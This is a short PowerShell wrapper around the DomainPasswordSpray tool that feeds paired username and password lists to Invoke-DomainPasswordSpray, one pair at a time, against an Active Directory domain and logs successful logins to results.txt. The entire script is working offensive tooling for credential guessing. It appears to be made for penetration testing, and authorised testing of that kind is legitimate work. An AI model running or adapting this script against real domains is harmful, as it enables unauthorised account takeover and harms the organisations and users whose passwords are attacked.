# Wrapper for DomainPasswordSpray
# https://github.com/dafthack/DomainPasswordSpray

# Created to perform a single user/single pass attack
# Drop this script in the same directory as DomainPasswordSpray, as well as two files containing users and passwords
# user.txt contains a line delimited list of usernames
# pass.txt contains a line delimited list of passwords

# user.txt and pass.txt MUST LINE UP e.g. the first user must match the first password, the second user must match the second password, etc.
# 

$passArray = @(Get-Content pass.txt)
$userArray = @(Get-Content user.txt)
Import-Module .\DomainPasswordSpray.ps1

# M23PRT is just a random directory name created to ensure it would not overlap with any user-created directories
Remove-Item -path .\M23PRT\ -recurse -ErrorAction SilentlyContinue # Cleanup from any previous runs
New-Item -Path ".\" -Name "M23PRT" -ItemType "directory" | Out-Null # And re-create the directory

If ($passArray.Length -eq $userArray.Length) { # Check to make sure both lists are the same size, otherwise there will be issues.
  Write-Host "Arrays are equal, length" $userArray.Length
  }  Else {
  Write-Host "Arrays are unbalanced! Users =" $userArray.Length "Passes =" $passArray.Length
}

for ($i=0; $i -lt $userArray.Length; $i++) { # Loop through the arrays and match up username/password
    $currPass = $passArray[$i]
    $currUser = $userArray[$i]
    $currUser > .\M23PRT\single_user_$currUser.txt # There's no single user flag, so create a text file for each single user
    $psCmd = "Invoke-DomainPasswordSpray -UserList .\M23PRT\single_user_$currUser.txt -Password ""$currPass"" -OutFile results.txt -Force"
	write-host $psCmd # Write it out just so we can see
	Invoke-Expression $psCmd # Execute the command
    }
